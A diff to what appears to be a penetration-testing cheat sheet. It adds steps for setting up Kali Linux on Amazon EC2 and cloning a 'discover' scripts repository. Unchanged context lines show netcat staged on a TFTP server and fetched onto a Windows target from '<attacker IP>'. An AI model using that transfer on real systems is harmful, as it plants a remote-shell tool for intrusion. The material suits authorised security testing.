@@ -218,7 +218,6 @@ atftpd --daemon --port 69 /tftp        Start tftp.
 netstat -anup | grep atftp             Verify the service is running.
 cp /usr/share/windows-binaries/nc.exe /tftp/
 tftp -i <attacker IP> get nc.exe       Run from Windows.
-
 ------------------------------------------------------------------------------------------------------
 
 # Update procedure
@@ -230,3 +229,25 @@ DbVisualizer
 Iceweasel plugins
 Nessus
 Nexpose
+------------------------------------------------------------------------------------------------------
+
+# Amazon EC2
+
+m1.xlarge
+
+sudo su
+passwd
+cd /root/
+apt-get install kali-linux-full
+apt-get update ; apt-get -y upgrade ; apt-get -y dist-upgrade ; apt-get -y autoremove ; apt-get -y autoclean
+apt-get install git
+
+git clone git://github.com/leebaird/discover.git /opt/scripts/
+cd /opt/scripts/
+./setup.sh
+
+Enable aliases: cp /opt/scripts/alias /root/.bash_aliases ; source /root/.bash_aliases
+update
+apt-get -f install
+apt-get install locate
+update
